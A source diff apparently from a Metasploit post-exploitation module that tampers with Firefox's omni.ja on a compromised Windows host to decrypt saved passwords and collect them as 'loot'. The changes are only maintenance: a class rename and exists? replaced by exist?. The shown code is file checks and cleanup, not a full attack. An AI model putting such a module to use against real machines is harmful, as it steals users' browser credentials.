@@ -21,7 +21,7 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -119,10 +119,10 @@ class Metasploit3 < Msf::Post
 
     # Check target for the necessary files
     if session.type == "meterpreter"
-      if session.fs.file.exists?(@paths['ff'] + temp_file) && !session.fs.file.exists?(@paths['ff'] + org_file)
+      if session.fs.file.exist?(@paths['ff'] + temp_file) && !session.fs.file.exist?(@paths['ff'] + org_file)
         print_error("Detected #{temp_file} without #{org_file}. This is a good sign of previous DECRYPT attack gone wrong.")
         return
-      elsif session.fs.file.exists?(@paths['ff'] + temp_file)
+      elsif session.fs.file.exist?(@paths['ff'] + temp_file)
         decrypt_file_stats(temp_file, org_file, @paths['ff'])
         if datastore['RECOVER']
           return unless decrypt_recover_omni(temp_file, org_file)
@@ -130,7 +130,7 @@ class Metasploit3 < Msf::Post
           print_warning("If you wish to continue by trying to recover, set the advanced option, RECOVER, to TRUE.")
           return
         end
-      elsif !session.fs.file.exists?(@paths['ff'] + org_file)
+      elsif !session.fs.file.exist?(@paths['ff'] + org_file)
         print_error("Could not download #{org_file}. File does not exist.")
         return
       end
@@ -216,9 +216,9 @@ class Metasploit3 < Msf::Post
     rename_file(@paths['ff'] + temp_file, @paths['ff'] + org_file)
 
     if session.type == "meterpreter"
-      print_error("There is still #{temp_file} on the target. Something went wrong.") if session.fs.file.exists?(@paths['ff'] + temp_file)
+      print_error("There is still #{temp_file} on the target. Something went wrong.") if session.fs.file.exist?(@paths['ff'] + temp_file)
 
-      unless session.fs.file.exists?(@paths['ff'] + org_file)
+      unless session.fs.file.exist?(@paths['ff'] + org_file)
         print_error("#{org_file} is no longer at #{@paths['ff'] + org_file}")
         return false
       end
@@ -610,13 +610,13 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     # Lets just check theres something before going forward
     if session.type == "meterpreter"
       i=20
-      vprint_status("Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated") unless session.fs.file.exists?(@paths['loot'])
-      while (!session.fs.file.exists?(@paths['loot']))
+      vprint_status("Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated") unless session.fs.file.exist?(@paths['loot'])
+      while (!session.fs.file.exist?(@paths['loot']))
         sleep 1
         i -= 1
         break if i == 0
       end
-      print_error("Missing loot file. Something went wrong.") unless session.fs.file.exists?(@paths['loot'])
+      print_error("Missing loot file. Something went wrong.") unless session.fs.file.exist?(@paths['loot'])
     end # session.type == "meterpreter"
 
     print_status("Restoring original .JA: #{temp_file}")
@@ -627,17 +627,17 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     vprint_status("Cleaning up: #{new_file}")
     file_rm(new_file)
     if session.type == "meterpreter"
-      if session.fs.file.exists?(temp_file)
+      if session.fs.file.exist?(temp_file)
         print_error("Detected backup file (#{temp_file}) still on the target. Something went wrong.")
       end
-      unless session.fs.file.exists?(org_file)
+      unless session.fs.file.exist?(org_file)
         print_error("Unable to find #{org_file} on target. Something went wrong.")
       end
     end # session.type == "meterpreter"
 
     # At this time, there should have a loot file
     if session.type == "meterpreter"
-      unless session.fs.file.exists?(@paths['loot'])
+      unless session.fs.file.exist?(@paths['loot'])
         print_error("DECRYPT failed. Either something went wrong (download/upload? Injecting?), there is a master password or an unsupported Firefox version.")
         # Another issue is encoding. The files may be seen as 'data' rather than 'ascii'
         print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading/uploading)") if session.type != "meterpreter"
